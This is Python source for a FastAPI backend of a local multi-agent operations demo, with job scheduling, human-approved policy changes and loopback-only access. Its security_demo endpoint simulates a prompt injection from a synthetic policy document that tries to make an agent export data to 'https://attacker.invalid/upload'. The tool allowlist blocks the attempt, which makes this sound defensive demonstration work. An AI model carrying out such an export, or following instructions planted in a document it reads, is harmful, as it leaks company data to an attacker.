import asyncio
from contextlib import asynccontextmanager
import json
from uuid import uuid4
from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, JSONResponse, StreamingResponse
from fastapi.staticfiles import StaticFiles
from .config import Settings
from .events import EventBus
from .llm import LocalLLM
from .insights import build_insights
from .models import AgentControl, AgentCreate, CompareRequest, Job, JobCreate, OptimizationDecision, SecurityDemoRequest, ToolCall, utc_now
from .scheduler import Scheduler
from .scheduler.benchmark import compare_policies
from .security import PermissionDenied, authorize_tool, is_loopback_url, validate_configuration
from .storage import Store
from .telemetry import DeviceTelemetry, machine_identity


def create_app(settings: Settings | None = None, llm=None):
    settings = settings or Settings()
    store = Store(settings.db_path)
    events = EventBus(store)
    llm = llm or LocalLLM(settings)
    scheduler = Scheduler(store, events, settings, llm)
    telemetry = DeviceTelemetry()
    scenario_lock = asyncio.Lock()

    @asynccontextmanager
    async def lifespan(app):
        await scheduler.start()
        yield
        await scheduler.stop()
        store.close()

    app = FastAPI(title="LocalOps AI", version="1.0.0", lifespan=lifespan)
    app.state.store = store
    app.state.scheduler = scheduler
    app.state.llm = llm
    app.add_middleware(CORSMiddleware, allow_origin_regex=r"^https?://(localhost|127\.0\.0\.1|\[::1\])(:\d{1,5})?$", allow_credentials=False, allow_methods=["GET", "POST"], allow_headers=["Content-Type"])

    @app.middleware("http")
    async def loopback_boundary(request: Request, call_next):
        host_url = "http://" + request.headers.get("host", "")
        if not is_loopback_url(host_url):
            return JSONResponse({"detail": "Only loopback host requests are accepted."}, status_code=403)
        origin = request.headers.get("origin")
        if origin and not is_loopback_url(origin):
            return JSONResponse({"detail": "Only local browser origins may access LocalOps."}, status_code=403)
        content_length = request.headers.get("content-length")
        if content_length:
            try:
                oversized = int(content_length) > 131072
            except ValueError:
                return JSONResponse({"detail": "Invalid content length."}, status_code=400)
            if oversized:
                return JSONResponse({"detail": "Request exceeds the local demo size limit."}, status_code=413)
        response = await call_next(request)
        response.headers["X-Content-Type-Options"] = "nosniff"
        return response

    async def metrics_data():
        jobs = store.all("jobs")
        agents = []
        for agent in store.all("agents"):
            own = [j for j in jobs if j["agent_id"] == agent["id"]]
            complete = [j for j in own if j["status"] == "completed"]
            timed = [j["metrics"]["processing_ms"] for j in complete if "processing_ms" in j["metrics"]]
            agents.append({"id": agent["id"], "name": agent["name"], "status": agent["status"], "completed_jobs": len(complete), "mean_processing_ms": round(sum(timed) / len(timed), 2) if timed else None, "tokens": sum(j["metrics"].get("tokens") or 0 for j in complete), "scope": "job/request-level; no GPU allocation inferred"})
        return {"active_jobs": sum(j["status"] == "running" for j in jobs), "queued_jobs": sum(j["status"] == "queued" for j in jobs), "completed_jobs": sum(j["status"] == "completed" for j in jobs), "error_jobs": sum(j["status"] in {"error", "blocked"} for j in jobs), "total_jobs": len(jobs), "agents": agents, "scheduler_policy": scheduler.policy, "device": await telemetry.sample()}

    @app.get("/api/health")
    async def health():
        return {"status": "ok", "service": "LocalOps AI", "local_inference": await llm.health_check(), "scheduler_policy": scheduler.policy, "synthetic_data": True}

    @app.get("/api/system")
    async def system():
        return {"device": machine_identity(), "telemetry": await telemetry.sample(), "inference": await llm.health_check(), "security": {"binding": "loopback-only", "inference_concurrency": 1, "allowlisted_tools_only": True, "external_connectors": False}, "offline_test": "Not inferred. Observe HR and Finance with WAN disconnected before claiming offline verification."}

    @app.get("/api/agents")
    async def agents():
        return store.all("agents")

    @app.get("/api/agents/{agent_id}/insights")
    async def agent_insights(agent_id: str):
        agent = store.get("agents", agent_id)
        if agent is None:
            raise HTTPException(404, "Agent not found")
        return build_insights(agent, store, settings)

    @app.post("/api/agents/{agent_id}/control")
    async def control_agent(agent_id: str, control: AgentControl):
        agent = store.get("agents", agent_id)
        if agent is None:
            raise HTTPException(404, "Agent not found")
        if agent["role"] not in {"hr", "finance", "support"}:
            raise HTTPException(409, "Security and Optimizer supervision stay enabled. Only business agents can pause work intake.")
        own = [job for job in store.all("jobs") if job["agent_id"] == agent_id]
        running = sum(job["status"] == "running" for job in own)
        queued = sum(job["status"] == "queued" for job in own)
        enabled = control.action == "resume"
        agent.update(enabled=enabled, pause_pending=not enabled and bool(running), status="running" if running else ("queued" if enabled and queued else "idle" if enabled else "paused"))
        if not enabled:
            agent["paused_at"] = utc_now()
        else:
            agent["resumed_at"] = utc_now()
        store.put("agents", agent)
        scheduler.wake.set()
        await events.publish("agents_updated", store.all("agents"))
        await events.activity(f"Human {control.action}d {agent['name']}'s work intake. " + ("Running work will finish; queued jobs are held." if not enabled else "Retained queued jobs may now run."), agent_id, event_type="agent_control", detail={"enabled": enabled, "running_jobs_interrupted": False})
        return {"agent": agent, "action": control.action, "queued_jobs": queued, "running_jobs": running, "running_jobs_interrupted": False, "pause_pending": agent["pause_pending"]}

    @app.post("/api/agents", status_code=201)
    async def create_agent(config: AgentCreate):
        try:
            validate_configuration(config)
        except PermissionDenied as exc:
            raise HTTPException(403, str(exc)) from exc
        if len(store.all("agents")) >= 30:
            raise HTTPException(409, "The local demo supports up to 30 agents.")
        agent = {**config.model_dump(mode="json"), "id": config.role + "-" + uuid4().hex[:8], "status": "idle", "enabled": True, "created_at": utc_now(), "last_activity_at": None}
        store.put("agents", agent)
        await events.publish("agents_updated", store.all("agents"))
        await events.activity(f"Agent {config.name} activated with approved {config.role} tools", agent["id"])
        return agent

    @app.get("/api/jobs")
    async def jobs(limit: int = 200):
        return list(reversed(store.all("jobs")))[:max(1, min(limit, 500))]

    @app.get("/api/jobs/{job_id}")
    async def job_detail(job_id: str):
        job = store.get("jobs", job_id)
        if job is None:
            raise HTTPException(404, "Job not found")
        return job

    @app.post("/api/jobs", status_code=202)
    async def submit_job(config: JobCreate):
        agent = store.get("agents", config.agent_id)
        if agent is None:
            raise HTTPException(404, "Agent not found")
        if agent["role"] not in {"hr", "finance", "support"}:
            raise HTTPException(422, "Use this station's dedicated optimizer or security action.")
        if not agent.get("enabled", True):
            raise HTTPException(409, "This agent is paused. Resume its work intake before submitting a task; existing queued jobs are retained.")
        if sum(j["status"] in {"queued", "running"} for j in store.all("jobs")) >= 50:
            raise HTTPException(429, "The local queue is full. Wait for existing jobs to finish.")
        job = Job(id=str(uuid4()), agent_id=agent["id"], type=agent["role"], prompt=config.prompt, priority=config.priority, status="queued", created_at=utc_now()).model_dump(mode="json")
        store.put("jobs", job)
        await scheduler.agent_state(agent["id"], "queued")
        await events.publish("job_updated", job)
        await events.activity(f"{agent['name']} received a {config.priority} job", agent["id"], job["id"])
        scheduler.wake.set()
        return job

    @app.get("/api/metrics")
    async def metrics():
        return await metrics_data()

    @app.get("/api/activity")
    async def activity():
        return store.all("events")[-100:]

    @app.get("/api/sources")
    async def sources():
        return [{"id": "handbook.txt", "name": "Cedar & Coast handbook", "role": "hr", "synthetic": True}, {"id": "invoices.csv", "name": "Fictional invoice ledger", "role": "finance", "synthetic": True}, {"id": "support_playbook.txt", "name": "Fictional support playbook", "role": "support", "synthetic": True}, {"id": "support_tickets.json", "name": "Fictional support queue (includes playbook retrieval)", "role": "support", "synthetic": True}, {"id": "injection_policy.txt", "name": "Controlled injection policy", "role": "hr", "synthetic": True}]

    @app.get("/api/events")
    async def event_stream(request: Request):
        queue = asyncio.Queue(maxsize=100)
        events.subscribers.add(queue)

        async def stream():
            try:
                snapshot = {"agents": store.all("agents"), "jobs": list(reversed(store.all("jobs")))[0:200], "events": store.all("events")[-40:], "metrics": await metrics_data()}
                yield "event: snapshot\ndata: " + json.dumps(snapshot) + "\n\n"
                while not await request.is_disconnected():
                    try:
                        event = await asyncio.wait_for(queue.get(), timeout=12)
                        yield "event: " + event["type"] + "\ndata: " + json.dumps(event["data"]) + "\n\n"
                    except asyncio.TimeoutError:
                        yield ": heartbeat\n\n"
            finally:
                events.subscribers.discard(queue)
        return StreamingResponse(stream(), media_type="text/event-stream", headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})

    @app.post("/api/scenarios/compare")
    async def compare(config: CompareRequest = CompareRequest()):
        if scenario_lock.locked():
            raise HTTPException(409, "A scheduler comparison is already running.")
        async with scenario_lock:
            await scheduler.agent_state("optimizer", "running")
            await events.activity("Timing FIFO and priority on identical synthetic worker jobs", "optimizer")
            result = await compare_policies()
            improvement = result["improvement"]["urgent_wait_ms"]
            recommendation = f"Priority reduced urgent queue wait by {improvement:.2f} ms in this synthetic scheduler run. Already-running work completed safely. This is a queue policy measurement, not an inference speed or GPU efficiency claim. Approve priority mode only if urgent response time matters more than standard queue order." if improvement > 0 else "No improvement in urgent waiting time was observed. Keep FIFO unless another measured run supports a change."
            result["recommendation"] = {"answer": recommendation, "source": "deterministic"}
            if config.include_narrative:
                try:
                    result["recommendation"] = await llm.chat("Explain these measured scheduler results in at most 100 words. Never claim inference or GPU speedups, money savings, or a policy change already applied. State that the jobs are synthetic timed work and human approval is required.", json.dumps(result), max_tokens=400)
                except Exception as exc:
                    result["recommendation"]["inference_error"] = str(exc)
            result.update(id=str(uuid4()), timestamp=utc_now(), current_policy=scheduler.policy)
            store.put("settings", {"id": "last_comparison", "result": result})
            await scheduler.agent_state("optimizer", "completed")
            await events.publish("optimizer_updated", result)
            await events.activity("Scheduler comparison complete; awaiting explicit policy approval", "optimizer", detail={"improvement": result["improvement"], "kind": result["kind"]})
            return result

    @app.get("/api/scenarios/latest")
    async def latest_comparison():
        record = store.get("settings", "last_comparison")
        return record["result"] if record else None

    @app.post("/api/optimizer/approve")
    async def approve(decision: OptimizationDecision):
        if not decision.approved:
            raise HTTPException(403, "A scheduling policy change requires explicit human approval.")
        old = scheduler.policy
        store.put("settings", {"id": "scheduler", "policy": decision.policy, "approved_at": utc_now()})
        scheduler.wake.set()
        await events.activity(f"Human approved scheduler policy: {old} → {decision.policy}. Running work is not interrupted.", "optimizer", event_type="optimization_approved")
        result = {"policy": decision.policy, "previous_policy": old, "approved": True, "running_jobs_interrupted": False}
        await events.publish("optimizer_updated", result)
        return result

    @app.post("/api/security/demo")
    async def security_demo(config: SecurityDemoRequest = SecurityDemoRequest()):
        agent = store.get("agents", config.agent_id)
        if agent is None:
            raise HTTPException(404, "Agent not found")
        source_text = (settings.data_dir / "injection_policy.txt").read_text()
        call = ToolCall(name="network.export", arguments={"destination": "https://attacker.invalid/upload", "data": "fictional_company_data"})
        try:
            authorize_tool(agent, call)
        except PermissionDenied as exc:
            reason = str(exc)
        else:
            raise HTTPException(500, "Security invariant failed; no action was executed.")
        await scheduler.agent_state("security", "blocked")
        event = await events.activity("Security Guardian refused network.export from untrusted document text", "security", event_type="security_blocked", detail={"requested_agent": agent["id"], "attempted_tool": call.name, "reason": reason, "executed": False})
        result = {"blocked": True, "attempted_tool": call.name, "reason": reason, "agent_id": agent["id"], "event": event, "source": {"document": "injection_policy.txt", "page": 1, "snippet": source_text, "synthetic": True}, "executed": False, "network_request_made": False, "files_modified": False, "boundary": "Deterministic role and agent tool allowlists; no network-export implementation exists."}
        await events.publish("security_blocked", result)
        return result

    # A built browser client is served on the same loopback origin as the API.
    dist = settings.data_dir.parent / "apps" / "web" / "dist"
    if dist.is_dir():
        if (dist / "assets").is_dir():
            app.mount("/assets", StaticFiles(directory=dist / "assets"), name="assets")

        @app.get("/{path:path}", include_in_schema=False)
        async def browser_app(path: str):
            if path.startswith("api/"):
                raise HTTPException(404, "API route not found")
            candidate = (dist / path).resolve()
            if candidate.is_relative_to(dist.resolve()) and candidate.is_file():
                return FileResponse(candidate)
            return FileResponse(dist / "index.html")

    return app


app = create_app()
